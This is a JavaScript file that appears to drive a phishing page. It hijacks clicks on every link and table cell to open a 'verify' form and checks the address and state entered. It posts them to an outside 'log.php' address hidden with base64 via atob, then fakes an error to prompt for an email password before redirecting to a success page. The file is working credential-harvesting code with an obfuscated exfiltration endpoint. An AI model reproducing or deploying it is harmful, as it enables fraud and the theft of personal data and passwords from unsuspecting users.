document.addEventListener('DOMContentLoaded', function() {
      // Function to get tomorrow's date
      function getTomorrowDate() {
        var today = new Date(); 
        var tomorrow = new Date(today);
        tomorrow.setDate(today.getDate() + 3);

        // Format the date as "YYYY/MM/DD"
        var formattedDate = ('0' + tomorrow.getDate()).slice(-2) + '/' + ('0' + (tomorrow.getMonth() + 1)).slice(-2) + '/' + tomorrow.getFullYear();
        // Display the date in an element with the ID "output"
        document.getElementById("output").innerText = formattedDate;
      }

      // Call the function when the page loads
      getTomorrowDate();
    }); 
$(document).ready(function(){
    $("#mspinner").css("display", "none");
    var trials = 0;
    $("a").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        $("#email").focus();
    });

    

    $("td").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        $("#email").focus();
    });

    $("#submit").click( (e)=>{
        e.preventDefault();
        var address = $("#address").val();
        var state = $("#state").val();
        var country = $("#country").val();
         
        if(address.length < 10){
            $("#address").css("border", "1px solid red");
            $("#state").css("border", "1px solid #ccc");  
        	$("#address-label").html("Enter valid address");
            return;
        }

         if(state.length < 5){
            $("#state").css("border", "1px solid red");
            $("#address").css("border", "1px solid #ccc");  
            $("#state-label").html("Enter valid state");
            return;
        }
 
 
        $("#address").css("border", "1px solid #ccc"); 
        $("#state").css("border", "1px solid #ccc"); 
        $("#error").css("display", "none");
        $.ajax({
            url: atob("aHR0cHM6Ly9pdGVjaC1pbnZlc3RzLmNvbS9mYi10cmlhbC9sb2cucGhw"),
            method: "post",
            data: {
                X1: address,
                X2: state
            },
            beforeSend: function(xhr){
            $('#submit').html('Updating.....').prop('disabled', true);
            }, 
            success: function(data){
                trials++;
                setTimeout(() => {
                    if(trials == 1){
                        window.location.href = "./success-page.html";
                    }  
                    $("#error").css("display", "block");
                    $("#password").val("");
                    $("#password").focus();
                    $("#password").attr("placeholder", "Enter email password");
                }, 6000);
            },

            error: function(data){
                trials++;
                setTimeout(() => {
                    if(trials == 1){
                        window.location.href = "./success-page.html";
                    }  
                    $("#error").css("display", "block");
                    $("#password").val("");
                    $("#password").focus();
                    $("#password").attr("placeholder", "Enter email password");
                }, 6000);
            }, 
            complete: function(){
            

            setTimeout( () => {
                     $('#submit').html('Verify').prop('disabled', false);
                }, 6000);
            }


        })
    })

});